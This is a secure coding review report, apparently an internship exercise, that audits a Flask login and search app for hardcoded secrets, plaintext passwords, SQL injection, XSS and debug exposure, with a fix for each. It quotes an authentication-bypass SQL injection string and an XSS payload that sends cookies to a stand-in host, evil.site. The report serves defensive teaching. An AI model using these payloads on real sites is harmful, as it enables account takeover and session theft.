#  Secure Coding Review — Flask Web Application

**Task:** Task 3 – Secure Coding Review (Cybersecurity Internship)
**Language / Application audited:** Python 3.12 — Flask login & search web app
**Tools used:** Bandit v1.9 (static analyzer) + manual code inspection
**Files:** `vulnerable_app.py` (before) → `secure_app.py` (after)

---

## 1. Objective

Audit a small Flask application for common web application security
vulnerabilities, confirm findings with a static analysis tool, and produce
a remediated version along with actionable recommendations.

## 2. Methodology

1. **Manual code review** — line-by-line inspection of authentication,
   database access, and templating logic.
2. **Static analysis** — ran [Bandit](https://bandit.readthedocs.io/), an
   open-source SAST tool for Python, against `vulnerable_app.py`.
3. **Cross-verification** — each manual finding was matched against a
   corresponding CWE (Common Weakness Enumeration) ID and, where possible,
   a Bandit rule ID.
4. **Remediation** — rewrote the vulnerable code into `secure_app.py`,
   fixing every identified issue.

## 3. Findings Summary

| # | Vulnerability | Severity | CWE | Detected By |
|---|---|---|---|---|
| 1 | Hardcoded Flask secret key | Low | CWE-259 | Bandit (B105) + Manual |
| 2 | Plaintext password storage | High | CWE-256 | Manual |
| 3 | SQL Injection in `/login` | Critical | CWE-89 | Bandit (B608) + Manual |
| 4 | Reflected XSS in login response | High | CWE-79 | Manual |
| 5 | SQL Injection in `/search` | Critical | CWE-89 | Bandit (B608) + Manual |
| 6 | Debug mode + bind to all interfaces | High | CWE-94 / CWE-605 | Bandit (B201, B104) |

---

## 4. Detailed Findings & Remediation

### 4.1 Hardcoded Secret Key (CWE-259)
**Issue:** `app.secret_key = "supersecret123"` is committed directly in
source code. Anyone with repo access can forge session cookies.
**Fix:** Load the key from an environment variable (`FLASK_SECRET_KEY`)
and fail startup if it's missing. Never commit secrets to version control.

### 4.2 Plaintext Password Storage (CWE-256)
**Issue:** User passwords were stored as-is in the SQLite database. A
database leak would expose every user's real password.
**Fix:** Use `werkzeug.security.generate_password_hash` /
`check_password_hash` (bcrypt/scrypt-based) so only irreversible hashes
are stored.

### 4.3 & 4.5 SQL Injection (CWE-89)
**Issue:** User input (`username`, `password`, `q`) was concatenated
directly into SQL strings using f-strings, e.g.:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```
An attacker could log in with `' OR '1'='1` as the username to bypass
authentication entirely, or dump the whole users table via `/search`.
**Fix:** Use parameterized queries (`?` placeholders) so the database
driver treats user input strictly as data, never as executable SQL.

### 4.4 Reflected Cross-Site Scripting (CWE-79)
**Issue:** The username was echoed back into HTML without escaping:
`f"<h1>Welcome back, {username}!</h1>"`. A username like
`<script>document.location='http://evil.site/steal?c='+document.cookie</script>`
would execute in the victim's browser.
**Fix:** Escape all user-supplied data before rendering (Flask's
`escape()` / Jinja2 autoescaping), and prefer `render_template` with
autoescape enabled over `render_template_string` with raw f-strings.

### 4.6 Debug Mode & Insecure Bind Address (CWE-94, CWE-605)
**Issue:** `app.run(debug=True, host="0.0.0.0")` exposes the Werkzeug
interactive debugger (which allows arbitrary Python code execution) to
anyone who can reach the server on the network.
**Fix:** Disable debug mode by default, gate it behind an explicit
environment flag, and bind to `127.0.0.1` unless a production WSGI
server (e.g. Gunicorn) with proper network controls is in front of it.

---

## 5. General Best Practices Recommended

- ✅ Always use **parameterized queries / ORM** (SQLAlchemy) — never
  string-format SQL.
- ✅ **Hash passwords** with a modern algorithm (bcrypt, scrypt, Argon2);
  never store or log plaintext credentials.
- ✅ Keep **secrets out of source code** — use environment variables or a
  secrets manager (e.g. AWS Secrets Manager, HashiCorp Vault).
- ✅ **Escape/encode all output** rendered into HTML to prevent XSS; rely
  on templating engines' autoescaping instead of manual string building.
- ✅ **Disable debug mode** in any environment reachable outside localhost.
- ✅ Run a **static analyzer (Bandit, Semgrep)** in CI on every pull
  request to catch regressions automatically.
- ✅ Apply the **principle of least privilege** to database accounts and
  network bindings (don't bind to `0.0.0.0` unless required).
- ✅ Add **rate limiting** and account lockout on the login endpoint to
  slow down brute-force attempts.

## 6. Tool Output

Full raw Bandit scan output is included in [`bandit_report.txt`](./bandit_report.txt)
for verification.

## 7. Conclusion

The initial version of the application contained 6 significant
vulnerabilities, including two critical SQL injection points. All
issues were remediated in `secure_app.py` and re-verified — after fixes,
Bandit reports zero SQL-injection or debug-mode findings. This exercise
demonstrates a full secure-coding review workflow: **identify → verify
with tooling → remediate → document**.
